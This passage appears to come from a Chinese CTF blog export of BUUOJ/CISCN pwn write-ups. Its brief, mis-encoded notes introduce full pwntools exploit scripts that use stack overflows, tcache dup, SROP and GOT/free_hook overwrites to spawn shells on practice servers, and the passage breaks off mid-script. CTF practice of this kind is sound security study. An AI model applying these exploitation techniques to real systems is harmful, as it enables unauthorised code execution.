-*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_es_2\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28784\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsystem_plt = elf.plt['system']\n\nru(\"name?\\n\")\npayload1 = \"\"\npayload1 += \"A\"*(0x24)+\"B\"*0x4\np.send(payload1)\nru(\"BBBB\")\nstack_addr = u32(rc(4))\nebp_addr = stack_addr-0x10\nlog.info(\"ebp_addr:0x%x\"%ebp_addr)\n\npayload2 = p32(ebp_addr-0x28+0x8) #0\n#payload2 += p32(ebp_addr-0x40)\npayload2 += p32(system_plt) #4\npayload2 += p32(0x11111111) #padding\npayload2 += p32(ebp_addr-0x28 + 20) #8 binsh_addr\npayload2 += p32(ebp_addr) #12\npayload2 += \"/bin/sh\\x00\" #16\npayload2 = payload2.ljust(0x28,\"A\")\npayload2 += p32(ebp_addr-0x24) #old ebp\npause()\np.send(payload2)\n\n\np.interactive()\n```\n\n3.ciscn_2019_final_3ï¼šfreeä¹‹åæŒ‡é’ˆæœªç½®ç©ºï¼Œä¸”è¯¥2..27ç‰ˆçš„tcacheå­˜åœ¨dupæ¼æ´ã€‚åˆ©ç”¨ç¨‹åºæ³„éœ²å †åœ°å€ï¼Œå†åˆ©ç”¨dupæ§tcacheç»“æ„ä½“ã€‚ä¿®æ”¹ä¸€ä¸ªChunkçš„sizeåŸŸæˆ–è€…ç›´æ¥Freeæ‰ç¨‹åºæœ€å¼€å§‹è‡ªå¸¦çš„ä¸€ä¸ªchunkï¼Œä½¿å…¶è¿›å…¥unsortedbinã€‚ç„¶ååœ¨æ§tcacheï¼Œå†åˆ©ç”¨addå‡½æ•°æ³„éœ²libcåœ°å€ï¼Œæ”¹free_hookä¸ºsystemï¼Œfree(binsh)ä¸€æ­¥getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_3\"\nlibc_file= \"./libc.so.6\"\n#libc.so = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    #elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25451\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice > \"\n\n\ndef add(idx, size, context):\n    sla(menu, \"1\")\n    sla(\"input the index\\n\", str(idx))\n    sla(\"input the size\\n\", str(size))\n    sa(\"now you can write something\\n\", context)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"input the index\\n\", str(idx))\n\n# def show(idx):\n# sla(menu, \"3\")\n# sla(\"input index:\", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\nbarray = 0x11c10\n\nadd(0,0x18,\"A\"*0x18)\n\nru(\"gift :\")\nchunk0_addr = int(rc(14)[2:14],16)-0x10\nheap_base = chunk0_addr - 0x11e60\nbarry_addr = heap_base+0x2d0\nlog.info(\"heap_base:0x%x\"%heap_base)\ndelete(0)\n\nadd(1,0x28,\"A\"*0x8) #1\ndelete(1) #tcache(0x78):1\ndelete(1) #tcache(0x78):1->1\n\nadd(2,0x28,p64(chunk0_addr-0x11c10+0x10)) #tcache(0x78):1->barry\nadd(3,0x28,\"A\") #tcache(0x78):barry\nadd(4,0x28,\"barry\")\ndelete(4)\n\n\nadd(5,0x78,\"B\"*0x8) #5\ndelete(5) #tcache(0x78):5\ndelete(5) #tcache(0x78):5->5\nadd(6,0x78,p64(heap_base+0x10)) #tcache(0x78):5->heap_base+0x10\nadd(7,0x78,\"B\"*0x8) #tcache(0x78):heap_base+0x10\n\nadd(8,0x78,\"\\x07\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\nadd(9,0x38,\"\\x78\")\npause()\nadd(10,0x38,\"\\xb0\")\nru(\"gift :\")\nlibc_base = int(rc(14)[2:14],16) - 0x3ebc40 - 88 -8\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"free_hook:0x%x\"%free_hook)\n\nadd(11,0x78,\"\\x01\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\npause()\nadd(12,0x18,p64(system_addr))\nadd(13,0x58,\"/bin/sh\\x00\")\npause()\ndelete(13)\npause()\np.interactive()\n```\n\n4.ciscn_2019_n_3ï¼šæ²¡å•¥æ¼æ´ï¼Œå°±æ˜¯ç¨‹åºæœ¬èº«é—®é¢˜ï¼Œsträ¸ºç»“æ„ä½“å‹chunkï¼Œintä¸ºæ­£å¸¸chunkï¼Œä¸”chunkä¸­å­˜åœ¨å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥é€šè¿‡ä¸€å®šå †å¸ƒå±€ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼Œæ”¹æˆsystemå†åŠ bashå³å¯getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_n_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25896\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"CNote > \"\n\n\ndef add(idx, Type, length, value):\nsla(menu, \"1\")\nsla(\"Index > \", str(idx))\nsla(\"Type > \", str(Type))\nif Type == 1:\nsla(\"Value > \", value)\nif Type == 2:\nsla(\"Length > \", str(length))\nsla(\"Value > \", value)\n\ndef delete(idx):\nsla(menu, \"2\")\nsla(\"Index > \", str(idx))\n\ndef show(idx):\nsla(menu, \"3\")\nsla(\"Index > \", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\nadd(0,2,0x88,'A'*10)\nadd(1,2,0x38,'A'*10)\nadd(2,1,24,'1')\ndelete(1)\ndelete(2)\n\nadd(3,2,0xc,'dash'+ p32(system_plt))\nadd(4,2,0x38,'BBBB')\npause()\ndelete(1)\np.interactive()\npause()\n```\n\n5.ciscn_2019_n_5ï¼šæ ˆæº¢å‡ºï¼Œæ³„éœ²åœ°å€ROPã€‚æ²¡å¼€NXï¼Œshellcodeä¹Ÿè¡Œã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_n_5\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n'''\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26514\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = elf.sym['main']\n\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n\n#ret = 0x4004c9\n#pop_rdi_ret = 0x400713\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(ret)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\np.interactive()\n```\n\n6.ciscn_s_3ï¼šæ ˆæº¢å‡ºï¼Œåˆ©ç”¨SROPï¼Œæ ˆè¿ç§»ï¼Œå¸¸è§„getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_s_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28198\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmain_addr = elf.sym['main']\ngadget_rax_0xf = 0x4004DA\nsyscall_addr = 0x400517\n\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p64(main_addr)\np.sendline(payload1)\nstack_addr = u64(rc(0x30)[32:40].ljust(8,'\\x00'))\nlog.info(\"stack_addr:0x%x\"%stack_addr)\n\nbinsh_addr = 0x601030\n\nframe_read = SigreturnFrame() #è®¾ç½®readçš„SROPå¸§\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = binsh_addr\nframe_read.rdx = 0xf\nframe_read.rsp = stack_addr-280 + 0xf8\nframe_read.rip = syscall_addr\n\nlog.info(\"frame_read_addr:0x%x\"%(stack_addr-280))\n\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = binsh_addr\nframe_execve.rip = syscall_addr\n\npayload2 = \"\"\npayload2 += \"A\"*0x10\npayload2 += p64(gadget_rax_0xf)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_read)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_execve)\npause()\np.sendline(payload2)\npause()\np.sendline(\"/bin/sh\\x00\".ljust(0xf,'A'))\np.interactive()\n```\n\nâ–²éœ€è¦æ³¨æ„çš„æ˜¯ï¼š\n\nsyscallä¸€èˆ¬åé¢éƒ½æœ‰retï¼Œæ‰€ä»¥åœ¨sigreturn_frameä¹‹åå¦‚æœè¿˜éœ€è¦è°ƒç”¨å…¶ä»–çš„sigreturn_frameæˆ–è€…å…¶ä»–å‡½æ•°ï¼Œéƒ½æ˜¯éœ€è¦åœ¨ä¸Šä¸€ä¸ªsigreturn_frameä¸­è®¾ç½®rspï¼Œä½¿å¾—retæ­£å¸¸æ‰§è¡Œã€‚\n\nâ‘ å¦‚æœä¸‹ä¸€æ­¥è¿˜æ˜¯sigreturn_frameï¼Œåˆ™å°†ä¸Šä¸€ä¸ªçš„rspè®¾ç½®ä¸ºæŒ‡å‘syscall_ret_addrçš„æ ˆåœ°å€ã€‚\n\nâ‘¡å¦‚æœä¸‹ä¸€æ­¥æ˜¯å…¶ä»–å‡½æ•°ï¼Œåˆ™éœ€è®¾ç½®å¯¹åº”æŒ‡å‘å‡½æ•°åœ°å€çš„æ ˆåœ°å€ã€‚\n\n(è€Œä»¥ä¸Šçš„è®¾ç½®é€šå¸¸éœ€è¦ç»“åˆæ ˆåŠ«æŒæ¥æ“ä½œï¼Œæ•°æ®å¯æ§æ¯”è¾ƒæ–¹ä¾¿ï¼Œä¸ç”¨è¿˜å¾—ä»åŸå§‹æ ˆä¸Šæ‰¾å¯¹åº”çš„å‡½æ•°åœ°å€æˆ–è€…syscall_ret_addr)\n\n \n\n \n\n \n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•3","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•3/","content":"\n1.ciscn_final_5ï¼šç”±äºé¢˜ç›®æœ¬èº«åŸå› ï¼ŒchunkListä¸­å­˜æ”¾çš„å †åœ°å€æ˜¯chunk_addr+idxï¼Œæ‰€ä»¥idxä¸º16æ—¶å°±ä¼šå¯¼è‡´å­˜æ”¾çš„å †åœ°å€ä¸ºchunk_addr+0x10ã€‚åŒæ—¶æ”¾å…¥chunkListçš„é¡ºåºæ˜¯æŒ‰ç…§ç”³è¯·é¡ºåºæ”¾å…¥çš„ï¼Œåˆ é™¤å’Œä¿®æ”¹çš„æ—¶å€™ä¹Ÿæ˜¯é€šè¿‡éå†æŸ¥æ‰¾çš„ã€‚é‚£ä¹ˆå¦‚æœå…ˆç”³è¯·ç´¢å¼•ä¸º16ï¼Œ1çš„chunkï¼ŒchunkListä¸­å°±ä¼šå¦‚ä¸‹ï¼š\n\nchunk16_addr+0x10,chunk1_addr\n\nå¦‚æœè¿™æ—¶å€™é‡Šæ”¾ç´¢å¼•ä¸º0çš„Chunkï¼Œå°±ä¼šè¯¯ä»¥ä¸ºchunk16_addr+0x10ä¸ºç´¢å¼•ä¸º0çš„chunkï¼Œå¦‚æœäº‹å…ˆä¼ªé€ äº†chunk16_addr+0x10çš„sizeåŸŸï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå°†å…¶é‡Šæ”¾ï¼Œå†ç”³è¯·å›æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿåˆ¶é€ å †å—é‡å ï¼Œæœ‰äº†å †å—é‡å åŠ ä¸ŠeditåŠŸèƒ½å°±å¾ˆéšæ„äº†ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_5\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28635\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"your choice: \"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index: \", str(idx))\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \", con)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nfree_got = elf.got['free']\n__stack_chk_fail_got = elf.got['__stack_chk_fail']\n\nadd(16,0x10,p64(0x0)+p64(0x210))\nadd(1,0x10,p64(free_got))\nadd(2,0x20,p64(free_got))\nadd(3,0x30,p64(free_got))\nadd(4,0x40,p64(free_got))\n\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\n\nadd(5,0x200,p64(0x0)+p64(0x21)+p64(free_got))\nadd(6,0x10,\"Free\")\nadd(7,0x10,p64(puts_plt))\n\nedit(5,p64(0x0)+p64(0x21)+\np64(0x0)*0x3+p64(0x31)+\np64(__stack_chk_fail_got))\nadd(8,0x20,p64(__stack_chk_fail_got))\nadd(9,0x20,\"a\")\ndelete(9)\n\nlibc_base = u64(rc(6).ljust(8, '\\x00'))-libc.sym['puts']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym['system']\n\nedit(5,p64(0x0)+p64(0x21)+p64(0x0)*10+p64(free_got))\nadd(10,0x30,p64(free_got))\nadd(11,0x30,p64(system_addr))\nadd(12,0x60,\"/bin/sh\\x00\")\ndelete(12)\np.interactive()\n```\n\nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼Œæˆ‘çš„åšæ³•ä¸åƒå…¶ä»–äººç”³è¯·chunkåˆ°chunkListç›´æ¥æ§åˆ¶chunkå—ï¼Œä»è€Œä¿®æ”¹å †å—åœ°å€ä¼ å…¥åˆ°è¢«åŠ«æŒä¸ºputså‡½æ•°çš„free_gotæ¥æ³„éœ²åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥ç”³è¯·åˆ°gotè¡¨ä¸Šï¼Œå°†gotè¡¨ä½œä¸ºå †åœ°å€ä¼ å…¥è¢«åŠ«æŒä¸ºputså‡½æ•°çš„free_gotæ¥æ³„éœ²gotè¡¨ä¸­çš„åœ°å€ã€‚\n\nä½†æ˜¯è¿™é‡Œä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯é€‰æ‹©å“ªä¸€ä¸ªå‡½æ•°çš„gotè¡¨ä½œä¸ºå †åœ°å€ã€‚è¿™é‡Œä¸¤ç§è§£å†³åŠæ³•ï¼š\n\n(1)å¯ä»¥å‘é€sizeä¸º0ï¼Œé‚£ä¹ˆå°±ä¸ä¼šä¿®æ”¹åˆ°å‡½æ•°çš„gotè¡¨ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¦æ±‚åˆ©ç”¨0x20çš„tcacheçš„dupã€‚\n\n(2)å¦‚æœsizeä¸ä¸º0ï¼Œé‚£ä¹ˆç”³è¯·å †å—çš„æ—¶å€™åŠ¿å¿…è¦å‘é€æ•°æ®ï¼Œæœ€å°‘ä¹Ÿæ˜¯\\x0aã€‚é‚£ä¹ˆå‘é€æ•°æ®ä¹Ÿè‚¯å®šä¼šä¿®æ”¹åˆ°è¯¥å‡½æ•°çš„çœŸå®åœ°å€ï¼Œé‚£ä¹ˆæ³„éœ²å‡ºæ¥çš„å°±æ˜¯ä¿®æ”¹åçš„çœŸå®åœ°å€ï¼Œè€Œä¸”å¦‚æœè¯¥å‡½æ•°åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å®¹æ˜“è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆä¿®æ”¹ä¹‹åä¹ŸåŠ¿å¿…ä¼šä½¿å¾—ç¨‹åºå´©æºƒã€‚è¿™é‡Œæœ‰Libcæ–‡ä»¶è¿˜å¥½ï¼Œå¯ä»¥ç›´æ¥æŸ¥æ‰¾libcæ–‡ä»¶å¯¹äºå‡½æ•°çš„æœ€åä¸€ä¸ªå­—èŠ‚æ¥ä¿®å¤ä¸€ä¸‹ï¼Œä½†å¦‚æœæ²¡æœ‰libcæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ²¡æ‹›äº†ã€‚\n\nè¿™é‡Œå‡è®¾æ²¡æœ‰libcæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªä¸å¤ªèƒ½ç”¨åˆ°å‡½æ•°æ¥ä¿®æ”¹ï¼Œè¿™é‡Œåˆšå¥½æœ‰ä¸ª__stack_chk_fail_ï¼Œåªè¦ä¸è§¦å‘canaryï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸ä¼šè¢«è°ƒç”¨ï¼Œå…¶gotè¡¨æ˜¯å»¶è¿Ÿç»‘å®šçš„ï¼Œä¿å­˜çš„ä¸æ˜¯çœŸå®åœ°å€ï¼Œç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œã€‚åŒæ—¶è¿˜è¦æ³¨æ„çš„æ˜¯ç”±äºæ˜¯__stack_chk_fail_çš„gotè¡¨ä½œä¸ºå †åœ°å€ï¼Œä½†æ˜¯å®é™…ä¼ å…¥ç»™putså‡½æ•°çš„åœ°å€æ˜¯__stack_chk_fail_got-0x10ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ¥çš„æ˜¯å¯¹åº”çš„putså‡½æ•°çš„çœŸå®åœ°å€ã€‚\n\nä¹‹åå°±æ­£å¸¸åˆ©ç”¨0x20,0x30,0x40çš„tcacheæ¥ä»»æ„ç”³è¯·ä¿®æ”¹äº†ã€‚\n\n2.ciscn_2019_en_3ï¼šæ°´é¢˜ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œæ‰“free_hookï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ç¨‹åºæœ¬èº«çš„æç¤ºä¿¡æ¯ï¼Œæ³¨æ„ç©ºæ ¼å’ŒDEBUGçš„ä½¿ç”¨ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_en_3\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = 